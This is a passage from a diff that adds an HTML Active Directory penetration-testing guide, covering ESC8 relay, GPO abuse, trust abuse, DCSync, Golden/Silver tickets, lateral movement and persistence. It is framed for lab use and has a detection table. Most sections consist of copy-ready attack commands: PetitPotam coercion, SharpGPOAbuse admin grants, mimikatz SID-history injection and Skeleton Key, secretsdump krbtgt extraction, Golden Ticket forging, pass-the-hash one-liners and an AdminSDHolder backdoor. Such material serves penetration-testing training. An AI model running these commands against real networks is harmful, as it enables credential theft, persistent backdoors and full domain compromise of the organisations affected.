+        </div>
+
+        <h5>Lab Exploitation — ESC8</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Relay a DC's NTLM auth to the ADCS HTTP endpoint</span>
+<span class="cmd">certipy relay -target http://CA.domain.local/certsrv/certfnsh.asp -template DomainController</span>
+<span class="comment"># Coerce a DC to authenticate (PetitPotam, PrinterBug)</span>
+<span class="cmd">petitpotam.py attacker_ip DC01</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== GPO ==================== -->
+    <section class="section" id="gpo">
+      <h2>📝 GPO Abuse</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Group Policy Objects apply configuration to users/computers. Writable GPOs can be abused to push malicious settings.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>If you can modify a GPO linked to an OU containing privileged users, you can push logon scripts, scheduled tasks, or privilege grants.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>PowerView <code>Get-DomainGPO</code>, <code>Get-GPOReport</code>, SharpGPOAbuse.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After enumeration reveals writable GPOs.</p>
+        </div>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — GPO with Immediate Task</h5>
+        <div class="code-block">
+          <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Find GPOs you can modify</span>
+<span class="cmd">Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "Write" }</span>
+
+<span class="comment"># Use SharpGPOAbuse to add an immediate scheduled task</span>
+<span class="cmd">SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net localgroup administrators user /add" --GPOName "Vulnerable GPO"</span>
+
+<span class="comment"># Force policy update</span>
+<span class="cmd">gpupdate /force</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== TRUSTS ==================== -->
+    <section class="section" id="trusts">
+      <h2>🔗 Domain Trusts</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Trusts connect domains/forests, allowing users in one to access resources in another.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Trust relationships can extend your attack surface. Compromising a child domain can lead to parent domain compromise.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p><code>Get-DomainTrust</code>, <code>nltest /domain_trusts</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After compromising a domain — check if you can pivot to another.</p>
+        </div>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — SID History Abuse</h5>
+        <div class="code-block">
+          <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># If you have DA in child domain and SID filtering is disabled on the trust</span>
+<span class="comment"># Inject Enterprise Admins SID into your user's SID History</span>
+<span class="cmd">mimikatz.exe "sid::patch" "sid::add /sam:youruser /new:EnterpriseAdminsSID" exit</span>
+
+<span class="comment"># Now your user is effectively Enterprise Admin</span>
+<span class="cmd">dir \\parent-dc\c$</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — Trust Key Extraction</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Extract trust key from a DC</span>
+<span class="cmd">mimikatz.exe "lsadump::trust /patch" exit</span>
+
+<span class="comment"># Use the trust key to create an inter-realm TGT</span>
+<span class="cmd">mimikatz.exe "kerberos::golden /domain:child.local /sid:S-1-5-21-... /sids:S-1-5-21-...-519 /rc4:TRUSTKEY /user:Administrator /service:krbtgt /target:parent.local /ticket:inter_realm.kirbi" exit</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== DCSYNC ==================== -->
+    <section class="section" id="dcsync">
+      <h2>👑 DCSync</h2>
+      <span class="reliability rel-green">🟢 Reliable — if you have DCSync rights</span>
+
+      <div class="section-intro">
+        <strong>DCSync mimics a Domain Controller</strong> to request password hashes from AD. If you have the right permissions, you can extract any user's hash — including krbtgt.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>DCSync abuses the Directory Replication Service (DRS) protocol to replicate password hashes.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why dangerous</span>
+          <p>Extracting krbtgt's hash lets you forge Golden Tickets — full domain compromise.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Mimikatz <code>lsadump::dcsync</code>, Impacket <code>secretsdump.py</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>When you have DCSync rights (Replicating Directory Changes, Replicating Directory Changes All).</p>
+        </div>
+      </div>
+
+      <h4>Exploitability Checklist</h4>
+      <div class="exploit-check">
+        <span class="title">✓ Verify before exploiting</span>
+        <span class="ok">[✓]</span> Your user has Replicating Directory Changes + All<br>
+        <span class="ok">[✓]</span> You can reach the DC over network<br>
+        <span class="ok">[✓]</span> No firewall blocks DRS<br>
+        <span class="ok">[✓]</span> You understand the impact (this is a serious action)
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — DCSync krbtgt</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">secretsdump.py domain.local/user:password@DC01 -just-dc-user krbtgt</span>
+
+<span class="comment"># Or all users:</span>
+<span class="cmd">secretsdump.py domain.local/user:password@DC01 -just-dc</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — Mimikatz DCSync</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" exit</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== GOLDEN TICKET ==================== -->
+    <section class="section" id="golden">
+      <h2>🥇 Golden / Silver Tickets</h2>
+
+      <div class="section-intro">
+        <strong>Golden Tickets are forged TGTs.</strong> With the krbtgt hash, you can create a TGT for any user, valid for any service, for any duration.
+      </div>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">Golden Ticket</span>
+          <p>Forged TGT using krbtgt's hash. Grants access to any service in the domain.</p>
+        </div>
+        <div class="why-card">
+          <span class="label blue">Silver Ticket</span>
+          <p>Forged TGS using a service account's hash. Grants access to that specific service only.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Mimikatz <code>kerberos::golden</code>.</p>
+        </div>
+        <div class="why-card">
+          <span class="label limit">Persistence</span>
+          <p>Golden Tickets survive password resets — only krbtgt reset (twice) invalidates them.</p>
+        </div>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Golden Ticket</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># 1. Get the domain SID</span>
+<span class="cmd">whoami /user</span>   <span class="comment"># Remove the last -RID</span>
+
+<span class="comment"># 2. Create a Golden Ticket with the krbtgt hash</span>
+<span class="cmd">mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_HASH /ptt" exit</span>
+
+<span class="comment"># 3. Access any resource</span>
+<span class="cmd">dir \\DC01\c$</span>
+<span class="cmd">psexec.exe \\DC01 cmd.exe</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — Silver Ticket</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">mimikatz.exe "kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-XXXX /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt" exit</span>
+<span class="cmd">dir \\server.domain.local\c$</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== LATERAL ==================== -->
+    <section class="section" id="lateral">
+      <h2>↔️ Lateral Movement</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Moving from one compromised host to another using valid credentials, hashes, or tickets.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Domain Admin credentials are often only usable on specific hosts. You need to move to where they're valid.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>PsExec, WMI, WinRM, RDP, SMB, scheduled tasks.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After obtaining credentials or hashes for another host.</p>
+        </div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="comment"># Pass-the-Hash with different tools</span>
+<span class="cmd">psexec.py -hashes :NTHASH user@target</span>
+<span class="cmd">wmiexec.py -hashes :NTHASH user@target</span>
+<span class="cmd">smbexec.py -hashes :NTHASH user@target</span>
+<span class="cmd">atexec.py -hashes :NTHASH user@target "whoami"</span>
+
+<span class="comment"># With WinRM</span>
+<span class="cmd">evil-winrm -i target -u user -H NTHASH</span>
+
+<span class="comment"># With RDP</span>
+<span class="cmd">xfreerdp /u:user /p:password /v:target</span></pre>
+      </div>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — PsExec</h5>
+        <div class="code-block">
+          <div class="code-header"><span>Linux</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">psexec.py domain.local/Administrator:password@target.domain.local</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== PERSISTENCE ==================== -->
+    <section class="section" id="persistence">
+      <h2>🔒 Persistence</h2>
+
+      <div class="why-grid">
+        <div class="why-card">
+          <span class="label">What</span>
+          <p>Maintaining access after initial compromise — even if passwords are changed.</p>
+        </div>
+        <div class="why-card">
+          <span class="label why">Why</span>
+          <p>Persistence is what separates a one-time compromise from a long-term foothold.</p>
+        </div>
+        <div class="why-card">
+          <span class="label how">How</span>
+          <p>Golden Tickets, Silver Tickets, Skeleton Key, DSRM, AdminSDHolder, SID History.</p>
+        </div>
+        <div class="why-card">
+          <span class="label when">When</span>
+          <p>After achieving DA — before the engagement ends.</p>
+        </div>
+      </div>
+
+      <h4>Common Persistence Techniques</h4>
+      <table>
+        <tr><th>Technique</th><th>Description</th><th>Invalidated by</th></tr>
+        <tr><td>Golden Ticket</td><td>Forged TGT with krbtgt hash</td><td>krbtgt reset (twice)</td></tr>
+        <tr><td>Silver Ticket</td><td>Forged TGS for a service</td><td>Service account password reset</td></tr>
+        <tr><td>Skeleton Key</td><td>Master password on DC</td><td>DC reboot</td></tr>
+        <tr><td>DSRM</td><td>DC's local admin account abuse</td><td>DSRM password change</td></tr>
+        <tr><td>AdminSDHolder</td><td>ACL applied to all admin objects</td><td>Manual cleanup</td></tr>
+        <tr><td>SID History</td><td>Add DA SID to a normal user</td><td>SID filtering / cleanup</td></tr>
+        <tr><td>GoldenGMSA</td><td>Forge gMSA passwords</td><td>KDS root key rotation</td></tr>
+      </table>
+
+      <div class="exploit-block">
+        <h5>🎯 Lab Exploitation — Skeleton Key</h5>
+        <div class="code-block">
+          <div class="code-header"><span>CMD</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Install Skeleton Key on a DC (requires DA + code execution on DC)</span>
+<span class="cmd">mimikatz.exe "privilege::debug" "misc::skeleton" exit</span>
+
+<span class="comment"># Now any user can authenticate with the master password "mimikatz"</span>
+<span class="cmd">net use \\DC01\c$ /user:domain\anyuser mimikatz</span></pre>
+        </div>
+
+        <h5>Lab Exploitation — AdminSDHolder</h5>
+        <div class="code-block">
+          <div class="code-header"><span>PowerShell</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="comment"># Give your user GenericAll over AdminSDHolder</span>
+<span class="cmd">Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity youruser -Rights All</span>
+
+<span class="comment"># Wait 60 minutes for SDProp to run — your user now has those rights over all admin objects</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== DC TAKEOVER ==================== -->
+    <section class="section" id="dc-takeover">
+      <h2>🏛️ Domain Controller Takeover</h2>
+
+      <div class="section-intro">
+        <strong>Controlling the DC is controlling the domain.</strong> Once you have DA, the DC is your playground.
+      </div>
+
+      <ul>
+        <li>Extract all hashes with DCSync</li>
+        <li>Create Golden Tickets for persistence</li>
+        <li>Modify GPOs for mass deployment</li>
+        <li>Add backdoor accounts</li>
+        <li>Access all domain-joined machines</li>
+      </ul>
+    </section>
+
+    <!-- ==================== CHAINING ==================== -->
+    <section class="section" id="chaining">
+      <h2>🔗 Attack Path Chaining</h2>
+
+      <div class="section-intro">
+        <strong>AD attacks are chains.</strong> No single finding gives you DA — but a chain of small findings does.
+      </div>
+
+      <h3>Example Chain 1 — Kerberoast → DA</h3>
+      <div class="code-block">
+        <pre>Valid Domain User
+      ↓
+Enumerate Users with SPN
+      ↓
+Kerberoast (Request TGS)
+      ↓
+Crack TGS Offline
+      ↓
+Service Account Password
+      ↓
+Service Account has GenericAll over Domain Admins group
+      ↓
+Add yourself to Domain Admins
+      ↓
+Domain Admin</pre>
+      </div>
+
+      <h3>Example Chain 2 — ADCS ESC1</h3>
+      <div class="code-block">
+        <pre>Valid Domain User
+      ↓
+Enumerate ADCS
+      ↓
+Find Vulnerable Template (ESC1)
+      ↓
+Request Certificate with Administrator SAN
+      ↓
+Authenticate as Administrator
+      ↓
+Domain Admin</pre>
+      </div>
+
+      <h3>Example Chain 3 — ACL Chain</h3>
+      <div class="code-block">
+        <pre>User A has GenericWrite over User B
+      ↓
+Set SPN on User B
+      ↓
+Kerberoast User B
+      ↓
+Crack User B's password
+      ↓
+User B has GenericAll over Group C
+      ↓
+Add User A to Group C
+      ↓
+Group C has DCSync rights
+      ↓
+DCSync krbtgt
+      ↓
+Golden Ticket → Domain Admin</pre>
+      </div>
+
+      <div class="mental-model">
+        <div class="title">🧠 Chaining mindset</div>
+        <p>BloodHound shows you these chains automatically. Learn to read the graph — every edge is a technique you can exploit.</p>
+      </div>
+    </section>
+
+    <!-- ==================== MATRIX ==================== -->
+    <section class="section" id="matrix">
+      <h2>📊 AD Technique Matrix</h2>
+      <p>Click a row to jump to the relevant technique. Reliability: 🟢 deterministic · 🟡 environment-dependent · 🔴 risky/unstable.</p>
+
+      <table>
+        <tr><th>Technique</th><th>Requirement</th><th>Privilege Gained</th><th>Reliability</th></tr>
+        <tr class="matrix-row" onclick="document.getElementById('asrep').scrollIntoView({behavior:'smooth'})"><td>AS-REP Roasting</td><td>User without preauth</td><td>User password (crackable)</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('kerberoast').scrollIntoView({behavior:'smooth'})"><td>Kerberoasting</td><td>User with SPN</td><td>Service account password</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('acl-abuse').scrollIntoView({behavior:'smooth'})"><td>ACL Abuse</td><td>Dangerous ACL over target</td><td>Varies (user/group/DA)</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('adcs').scrollIntoView({behavior:'smooth'})"><td>ADCS (ESC1–ESC8)</td><td>Vulnerable certificate template</td><td>Domain Admin</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('delegation').scrollIntoView({behavior:'smooth'})"><td>Unconstrained Delegation</td><td>Compromise of delegated host + DA connect</td><td>DA TGT</td><td>🟡</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('delegation').scrollIntoView({behavior:'smooth'})"><td>RBCD</td><td>Write access to target + machine account</td><td>Impersonation</td><td>🟡</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('gpo').scrollIntoView({behavior:'smooth'})"><td>GPO Abuse</td><td>Writable GPO linked to privileged OU</td><td>SYSTEM / DA</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('dcsync').scrollIntoView({behavior:'smooth'})"><td>DCSync</td><td>Replicating Directory Changes rights</td><td>Any user's hash</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('golden').scrollIntoView({behavior:'smooth'})"><td>Golden Ticket</td><td>krbtgt hash</td><td>Persistent DA</td><td>🟢</td></tr>
+        <tr class="matrix-row" onclick="document.getElementById('trusts').scrollIntoView({behavior:'smooth'})"><td>SID History</td><td>DA in child + trust with SID filtering off</td><td>Parent DA</td><td>🟡</td></tr>
+      </table>
+    </section>
+
+    <!-- ==================== AD CHECKLIST ==================== -->
+    <section class="section" id="ad-checklist">
+      <h2>✅ AD Attack Field Checklist</h2>
+      <p>Work through this top to bottom. Click items to save progress locally.</p>
+
+      <ul class="checklist">
+        <li><input type="checkbox"> <span>Identify current user — <code>whoami /all</code>, <code>net user %USERNAME% /domain</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate domain users — <code>net user /domain</code>, <code>Get-DomainUser</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate domain groups — <code>net group /domain</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate Domain Admins and Enterprise Admins</span></li>
+        <li><input type="checkbox"> <span>Enumerate computers — <code>Get-DomainComputer</code></span></li>
+        <li><input type="checkbox"> <span>Identify Domain Controllers — <code>Get-DomainController</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate trusts — <code>Get-DomainTrust</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate SPN accounts (Kerberoastable) — <code>Get-DomainUser -SPN</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate preauth-disabled accounts — <code>Get-DomainUser -PreauthNotRequired</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate ACLs — <code>Find-InterestingDomainAcl</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate GPOs — <code>Get-DomainGPO</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate OUs — <code>Get-DomainOU</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate shares — <code>Find-DomainShare</code></span></li>
+        <li><input type="checkbox"> <span>Enumerate sessions — <code>Find-DomainUserLocation</code></span></li>
+        <li><input type="checkbox"> <span>Check local admin access — <code>Find-LocalAdminAccess</code></span></li>
+        <li><input type="checkbox"> <span>Check for ADCS — <code>certipy find</code></span></li>
+        <li><input type="checkbox"> <span>Check for delegation — <code>Get-DomainComputer -Unconstrained</code></span></li>
+        <li><input type="checkbox"> <span>Run BloodHound collection — <code>SharpHound.exe -c All</code></span></li>
+        <li><input type="checkbox"> <span>Analyze BloodHound for paths to DA</span></li>
+        <li><input type="checkbox"> <span>Check password policy before spraying — <code>--pass-pol</code></span></li>
+        <li><input type="checkbox"> <span>Identify attack path and chain findings</span></li>
+        <li><input type="checkbox"> <span>Validate exploitation in a lab or with low-impact technique</span></li>
+        <li><input type="checkbox"> <span>Document root cause and remediation</span></li>
+      </ul>
+    </section>
+
+    <!-- ==================== DECISION TREE ==================== -->
+    <section class="section" id="decision-tree">
+      <h2>🌳 AD Attack Decision Tree</h2>
+
+      <div class="code-block">
+        <pre>Got domain credentials (any user)
+    ↓
+Enumerate users, groups, computers, trusts
+    ↓
+Run BloodHound (SharpHound -c All)
+    ↓
+Any Kerberoastable users?
+    → Yes → Kerberoast → Crack → New creds
+    ↓
+Any AS-REP roastable users?
+    → Yes → AS-REP roast → Crack → New creds
+    ↓
+Any dangerous ACLs?
+    → Yes → Abuse ACL (GenericAll, WriteDACL, etc.)
+    ↓
+Any ADCS templates?
+    → Yes → Check ESC1–ESC8 → Exploit
+    ↓
+Any unconstrained delegation?
+    → Yes → Coerce + capture TGT
+    ↓
+Any writable GPOs?
+    → Yes → SharpGPOAbuse → SYSTEM/DA
+    ↓
+Any trusts?
+    → Yes → SID History / Trust Key → Parent domain
+    ↓
+DCSync rights?
+    → Yes → Dump krbtgt → Golden Ticket
+    ↓
+Domain Admin → Forest Admin</pre>
+      </div>
+    </section>
+
+    <!-- ==================== LABS ==================== -->
+    <section class="section" id="labs">
+      <h2>🧪 Practical Labs</h2>
+      <p>These labs are designed for <strong>your own AD lab environments</strong> — GOAD, DetectionLab, HTB Pro Labs, TryHackMe AD rooms.</p>
+
+      <div class="accordion">
+        <div class="accordion-header">🏛️ Lab 1 — AD Enumeration Basics</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Enumerate users, groups, computers, and trusts from a low-priv domain account.</p>
+          <p><strong>Commands:</strong> <code>net user /domain</code>, <code>net group /domain</code>, <code>Get-DomainUser</code>, <code>Get-DomainComputer</code>.</p>
+          <p><strong>What to look for:</strong> Users with SPNs, preauth-disabled accounts, machine accounts.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">🔥 Lab 2 — Kerberoasting</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Find and crack a Kerberoastable account.</p>
+          <p><strong>Setup:</strong> Ensure a service account has an SPN and a weak password.</p>
+          <p><strong>Validation:</strong> <code>GetUserSPNs.py domain.local/user:pass -request</code> → <code>hashcat -m 13100</code>.</p>
+          <p><strong>Remediation:</strong> Use strong passwords for service accounts (25+ chars), use gMSAs.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">📜 Lab 3 — ADCS ESC1</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Exploit an ESC1 template to impersonate Domain Admin.</p>
+          <p><strong>Setup:</strong> Configure a template that allows SAN specification and client auth.</p>
+          <p><strong>Validation:</strong> <code>certipy find -vulnerable</code> → <code>certipy req -upn administrator@domain.local</code> → <code>certipy auth</code>.</p>
+          <p><strong>Remediation:</strong> Disable "Supply in the request" for SAN on templates.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">👑 Lab 4 — DCSync and Golden Ticket</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> DCSync krbtgt, then forge a Golden Ticket.</p>
+          <p><strong>Setup:</strong> Give your user DCSync rights.</p>
+          <p><strong>Validation:</strong> <code>secretsdump.py -just-dc-user krbtgt</code> → <code>mimikatz kerberos::golden /krbtgt:HASH</code>.</p>
+          <p><strong>Remediation:</strong> Remove unnecessary DCSync rights, monitor for DRS replication.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">📋 Lab 5 — ACL Chain</div>
+        <div class="accordion-body">
+          <p><strong>Objective:</strong> Chain ACL abuse: GenericWrite on a user → Kerberoast them → crack → use their permission to add to DA group.</p>
+          <p><strong>Validation:</strong> BloodHound shows the chain, you execute it step by step.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== TROUBLESHOOTING ==================== -->
+    <section class="section" id="troubleshooting">
+      <h2>🔧 Troubleshooting</h2>
+
+      <div class="section-intro">
+        <strong>AD attacks fail for predictable reasons.</strong> Walk the checklist before assuming the technique is broken.
+      </div>
+
+      <div class="code-block">
+        <pre>Attack identified
+    ↓
+Didn't work
+    ↓
+Check permissions (do you actually have the ACL?)
+    ↓
+Check inheritance (is the ACL blocked by deny?)
+    ↓
+Check target state (disabled? locked? already exploited?)
+    ↓
+Check network access (can you reach the target?)
+    ↓
+Check Kerberos vs NTLM (protocol mismatch?)
+    ↓
+Check time sync (Kerberos requires within 5 min)
+    ↓
+Check firewall (SMB? WinRM? LDAP?)
+    ↓
+Check tools (correct version? correct syntax?)
+    ↓
+Find another path</pre>
+      </div>
+
+      <div class="card">
+        <h4>"Kerberoasting returns no hashes."</h4>
+        <p>The account may have AES-only encryption (harder to crack), or no service accounts have SPNs. Check <code>Get-DomainUser -SPN</code> first.</p>
+      </div>
+      <div class="card">
+        <h4>"DCSync fails with access denied."</h4>
+        <p>You need Replicating Directory Changes AND Replicating Directory Changes All. Check with BloodHound or <code>Get-DomainObjectAcl -ResolveGUIDs</code>.</p>
+      </div>
+      <div class="card">
+        <h4>"BloodHound shows no paths."</h4>
+        <p>Either the environment is hardened (no paths from your user), or SharpHound collection was incomplete. Verify collection with <code>-c All</code>.</p>
+      </div>
+      <div class="card">
+        <h4>"ADCS certipy returns 'no vulnerabilities found'."</h4>
+        <p>The templates may be properly configured, or you may lack permission to view them. Check from a DA account if possible in lab.</p>
+      </div>
+      <div class="card">
+        <h4>"NTLM relay fails."</h4>
+        <p>SMB signing may be enforced, or the target may require Kerberos. Check with <code>netexec smb --gen-relay-list</code>.</p>
+      </div>
+      <div class="card">
+        <h4>"Golden Ticket doesn't grant access."</h4>
+        <p>Check: (1) SID correctness, (2) krbtgt hash correctness, (3) time sync, (4) target service accepts Kerberos. Reset your TGT cache with <code>klist purge</code>.</p>
+      </div>
+    </section>
+
+    <!-- ==================== DETECTION ==================== -->
+    <section class="section" id="detection">
+      <h2>🛡️ Detection & Defense</h2>
+      <table>
+        <tr><th>Technique</th><th>Indicator</th><th>Detection</th><th>Mitigation</th></tr>
+        <tr><td>Kerberoasting</td><td>Many TGS requests (4769)</td><td>Monitor for RC4 TGS requests</td><td>Strong service passwords, gMSA, AES-only</td></tr>
+        <tr><td>AS-REP Roasting</td><td>AS-REQ without preauth (4768)</td><td>Monitor for accounts without preauth</td><td>Enable Kerberos preauth everywhere</td></tr>
+        <tr><td>DCSync</td><td>DRS replication by non-DC (4662)</td><td>Monitor for DS-Replication-Get-Changes</td><td>Restrict DCSync rights, audit</td></tr>
+        <tr><td>Golden Ticket</td><td>4769 with weird TGT lifetime</td><td>Monitor for suspicious TGT properties</td><td>Reset krbtgt twice if compromised</td></tr>
+        <tr><td>ACL Abuse</td><td>LDAP modifications (5136)</td><td>Monitor for changes to ACLs, group memberships</td><td>Audit ACLs regularly</td></tr>
+        <tr><td>ADCS ESC1</td><td>Certificate requests with SAN</td><td>Monitor CA for unusual enrollments</td><td>Disable SAN specification on templates</td></tr>
+        <tr><td>Pass-the-Hash</td><td>NTLM logon (4624 type 3) with different user/host</td><td>Monitor for NTLM with privileged accounts</td><td>Disable NTLM, enforce Kerberos</td></tr>
+        <tr><td>Unconstrained Delegation</td><td>TGT extraction from memory</td><td>Monitor LSASS access</td><td>Remove unconstrained delegation</td></tr>
+      </table>
+    </section>
+
+    <!-- ==================== CHEAT SHEETS ==================== -->
+    <section class="section" id="cheatsheets">
+      <h2>📋 Command Cheat Sheets</h2>
+
+      <div class="tabs">
+        <button class="tab-btn active" data-tab="tab-recon">Recon</button>
+        <button class="tab-btn" data-tab="tab-attack">Attack</button>
+        <button class="tab-btn" data-tab="tab-post">Post-Exploit</button>
+      </div>
+
+      <div class="tab-content active" id="tab-recon">
+        <div class="code-block">
+          <div class="code-header"><span>Recon</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">net user /domain</span>                          <span class="comment"># List domain users</span>
+<span class="cmd">net group /domain</span>                         <span class="comment"># List domain groups</span>
+<span class="cmd">net group "Domain Admins" /domain</span>         <span class="comment"># DA members</span>
+<span class="cmd">Get-DomainUser -SPN</span>                       <span class="comment"># Kerberoastable users</span>
+<span class="cmd">Get-DomainUser -PreauthNotRequired</span>        <span class="comment"># AS-REP roastable</span>
+<span class="cmd">Get-DomainTrust</span>                           <span class="comment"># Domain trusts</span>
+<span class="cmd">Get-DomainComputer -Unconstrained</span>         <span class="comment"># Unconstrained delegation</span>
+<span class="cmd">Find-InterestingDomainAcl -ResolveGUIDs</span>   <span class="comment"># Interesting ACLs</span>
+<span class="cmd">SharpHound.exe -c All</span>                     <span class="comment"># BloodHound collection</span></pre>
+        </div>
+      </div>
+
+      <div class="tab-content" id="tab-attack">
+        <div class="code-block">
+          <div class="code-header"><span>Attack</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">GetUserSPNs.py domain.local/user:pass -request</span>     <span class="comment"># Kerberoast</span>
+<span class="cmd">GetNPUsers.py domain.local/ -usersfile users.txt</span>   <span class="comment"># AS-REP roast</span>
+<span class="cmd">secretsdump.py domain.local/user:pass@DC01</span>          <span class="comment"># DCSync</span>
+<span class="cmd">certipy find -u user@domain -p pass -dc-ip DC01 -vulnerable</span>  <span class="comment"># ADCS</span>
+<span class="cmd">certipy req -u user@domain -p pass -ca CA -template T -upn admin@domain</span></pre>
+        </div>
+      </div>
+
+      <div class="tab-content" id="tab-post">
+        <div class="code-block">
+          <div class="code-header"><span>Post-Exploit</span><button onclick="copyCode(this)">Copy</button></div>
+          <pre><span class="cmd">psexec.py domain.local/Administrator:pass@target</span>   <span class="comment"># PsExec</span>
+<span class="cmd">wmiexec.py -hashes :NTHASH user@target</span>             <span class="comment"># WMI</span>
+<span class="cmd">evil-winrm -i target -u user -p pass</span>              <span class="comment"># WinRM</span>
+<span class="cmd">mimikatz kerberos::golden /krbtgt:HASH</span>            <span class="comment"># Golden ticket</span>
+<span class="cmd">Rubeus.exe ptt /ticket:base64</span>                     <span class="comment"># Inject ticket</span></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== KNOWLEDGE CHECK ==================== -->
+    <section class="section" id="knowledge-check">
+      <h2>❓ Final Knowledge Check</h2>
+
+      <div class="accordion">
+        <div class="accordion-header">1. What is the difference between Kerberoasting and AS-REP Roasting?</div>
+        <div class="accordion-body">
+          <p><strong>Kerberoasting:</strong> Requesting a service ticket (TGS) for an account with an SPN — requires any valid domain user. <strong>AS-REP Roasting:</strong> Requesting an AS-REP for accounts with preauthentication disabled — can be done without credentials.</p>
+        </div>
+      </div>
+
+      <div class="accordion">
+        <div class="accordion-header">2. You have a low-priv domain user. What are the first 5 things you enumerate?</div>
